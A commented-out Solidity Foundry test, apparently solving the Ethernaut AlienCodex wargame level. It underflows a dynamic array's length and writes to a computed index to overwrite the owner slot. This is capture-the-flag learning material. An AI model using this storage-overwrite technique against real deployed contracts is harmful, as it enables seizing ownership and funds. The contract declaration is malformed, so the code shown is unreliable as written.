/* THIS ATTACK EXPLOITS A BUG IN A DEPRECATED SOLIDITY VERSION THAT IS NOT COMPATIBLE WITH FOUNDRY, THE ATTACK IS INCLUDED FOR COMPLETENESS*/
/*
pragma solidity ^0.8.0;

import "src/levels/AlienCodex/AlienCodexFactory.sol";
import "src/levels/AlienCodex/AlienCodex.sol";
import "forge-std/Test.sol";

contract AlienCodexAttackTest Level{
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    AlienCodexFactory public factory;
    AlienCodex public instance;
    
    function setUp() public {
        factory = new AlienCodexFactory();
        instance = AlienCodex(factory.createInstance(dummyPlayerAddress));
    }
    
    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance((address(instance)),dummyPlayerAddress), false);
    }
    
    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress);

        // Make contact
        instance.makeContact();

        // Init array
        instance.record(bytes32(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff));

        // Underflow array length
        instance.retract();
        instance.retract();

        // Compute Owner's slot offset referenced to array index 0 slot
        // Owner is in slot 0000000000000000000000000000000000000000000000000000000000000000
        // Array is in slot 0000000000000000000000000000000000000000000000000000000000000001
        // Array[0] is in slot H(0x0000000000000000000000000000000000000000000000000000000000000001) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 
        // To write Owner's slot we have to write array[offset],
        // where offset = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0x0000000000000000000000000000000000000000000000000000000000000001

        uint256 offset = 
        uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
        - uint256(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
        + uint256(0x0000000000000000000000000000000000000000000000000000000000000001);
    
        // change ownership
        instance.revise(offset,bytes32(uint256(uint160(dummyPlayerAddress))));
            
        assertEq(factory.validateInstance((address(instance)),dummyPlayerAddress), true);
    }
}
*/